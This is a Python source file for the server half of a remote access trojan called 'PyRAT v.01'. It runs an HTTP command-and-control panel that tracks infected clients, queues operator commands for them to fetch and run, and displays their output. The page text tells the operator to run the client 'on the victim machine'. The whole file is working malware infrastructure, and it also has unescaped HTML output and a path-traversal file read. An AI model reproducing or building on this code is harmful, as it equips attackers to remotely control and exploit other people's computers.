#!/usr/bin/python
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import json
from pathlib import Path
import sys, getopt

version = "PyRAT v.01"
hostName = "localhost"
serverPort = 8080



class RatServer(BaseHTTPRequestHandler):

    clientMap={}
    i=0

    def do_GET(self):
        if self.path.startswith("/css/"):
            
            cssfile = self.path.replace("/css",str(Path(__file__).resolve().parent))
            
            #print("getting file "+cssfile)
            with open(cssfile) as f:
                lines = "\n".join(f.readlines())
                if lines!=None:
                    self.send_response(200)
                    self.send_header("Content-type", "css")
                    self.end_headers()
                    self.wfile.write(bytes(lines, "utf-8"))
            return

        if self.path == "/client/command":
            
            self._updateClient()
            #print(RatServer.clientMap)
            clientAddress = self.client_address[0]
            commandList = []
            
            for command in RatServer.clientMap[clientAddress]['commands']:
                #print(str(command))
                if command['pickedup']==False:
                    commandList.append(command)
                    command['pickedup']=True
            self.send_response(200)
            self.send_header("Content-type", "json")
            self.end_headers()
            self.wfile.write(bytes(json.dumps(commandList), "utf-8"))
            return
        

        if self.path == "/":
            t = time.time()
            clients = []
            for client, data in RatServer.clientMap.items():
                if t-data['lastseen']<=60: # don't include clients not seen in 60 seconds
                    clients.append(str(client))
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes("<html><head><title>%s</title></head>" % version, "utf-8"))
            self.wfile.write(bytes("<link rel=\"stylesheet\" href=\"/css/style.css\">", "utf-8"))
            self.wfile.write(bytes("<script>function submit(host,t,cmd){var xhttp = new XMLHttpRequest();xhttp.open(\"POST\", \"/server/command\");xhttp.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { var response = this.responseText;window.location.reload(); }};xhttp.send(JSON.stringify({\"host\":host,\"cmdType\":t,\"cmd\":cmd}));}</script>", "utf-8"))

            self.wfile.write(bytes("<body><div id=\"banner\"></div>", "utf-8"))
            if len(clients)==0:
                self.wfile.write(bytes("<p>No active clients, please run the client on the victim machine and refresh the page.</p>", "utf-8"))
            for client in clients:
                self.wfile.write(bytes("<p><div id=\"client\">Host: %s</div><div id=\"hostframe\"><div id=\"inputs\">Type:<input id=\"%s-cmdType\" value=\"cmd\">&nbsp;Command:<input id=\"%s-cmd\" value=\"\"> <button onclick=\"submit('%s',document.getElementById('%s-cmdType').value,document.getElementById('%s-cmd').value);\">Run!</button></div> " % (client,client,client,client,client,client) , "utf-8"))
                for commands in RatServer.clientMap[client]['commands']:
                    if t-commands['lastseen'] <= 500: # don't display commands that are too old
                        if commands['result']!=None:
                            result = commands['result']
                        else:
                            result = "* Running: refresh page for result *"
                        self.wfile.write(bytes("<p><div id=\"command\">_&gt; %s</div><div id=\"output\">%s</div></p>" % (commands['cmd'],  result) , "utf-8"))
                self.wfile.write(bytes("</div></p>", "utf-8"))
            self.wfile.write(bytes("</body></html>", "utf-8"))
            return
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("<html><head><title>%s</title></head>" % version, "utf-8"))
        self.wfile.write(bytes("<body>", "utf-8"))
        self.wfile.write(bytes("<p>Path not implemented: %s</p>" % self.path, "utf-8"))
        self.wfile.write(bytes("</body></html>", "utf-8"))
    
    def do_POST(self):
        if self.path == "/server/command":
            self._updateClient()
            content_len = int(self.headers.get('Content-Length'))
            post_body = self.rfile.read(content_len).decode("utf-8")
            #print("post:"+str(post_body))
            try:
                cmd=""
                host=""
                cmdType = ""
                postObj = json.loads(post_body)
                if 'cmd' in postObj:
                    cmd = postObj['cmd']
                if 'host' in postObj:
                    host = postObj['host']
                if 'cmdType' in postObj:
                    cmdType = postObj['cmdType']
                if host!="" and cmd!="" and host in RatServer.clientMap:
                    RatServer.clientMap[host]['commands'].append({'cmd':cmd,'result':None,'lastseen':time.time(),'pickedup':False,'cmdType':cmdType})
                    self.send_response(200)
                    self.send_header("Content-type", "text")
                    self.end_headers()
                    self.wfile.write(bytes("OK", "utf-8"))
                    #print(RatServer.clientMap)
                    return
            except Exception as e:
                print("Error: /server/command "+post_body+" "+e.msg)
            self.send_response(500)
            self.send_header("Content-type", "text")
            self.end_headers()
            self.wfile.write(bytes("ERROR", "utf-8"))
            return


        
        if self.path == "/client/response":
            self._updateClient()
            content_len = int(self.headers.get('Content-Length'))
            post_body = self.rfile.read(content_len)
            postObj = json.loads(post_body)
            cmd = None
            result = None
            if 'cmd' in postObj:
                cmd = postObj['cmd']
            if 'result' in postObj:
                result = postObj['result']

            clientAddress = self.client_address[0]
            if cmd!=None and result!=None:
                if RatServer.clientMap[clientAddress]:
                    for command in RatServer.clientMap[clientAddress]['commands']:
                        if command['cmd']==cmd and command['result']==None:
                            command['result']=result
                            self.send_response(200)
                            self.send_header("Content-type", "text")
                            self.end_headers()
                            self.wfile.write(bytes("OK", "utf-8"))
                            return
            #print("response post")
            return

    def _updateClient(self):
        clientAddress = self.client_address[0]
        #if not hasattr(self.server, 'clientMap'):
        #    RatServer.clientMap = {}
        if clientAddress not in RatServer.clientMap:
            RatServer.clientMap[clientAddress]={'commands':[]}
        RatServer.clientMap[clientAddress]['lastseen']=time.time()

if __name__ == "__main__":
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hs:p:",["server=","port="])
    except getopt.GetoptError:
        print('server.py -s <server_name> -p <server_port>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('server.py -s <server_name> -p <server_port>')
            sys.exit()
        elif opt in ("-s", "--server"):
            hostName = arg
        elif opt in ("-p", "--port"):
            serverPort = int(arg)

    webServer = HTTPServer((hostName, serverPort), RatServer)
    print("PyRAT Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("PyRAT Server stopped.")
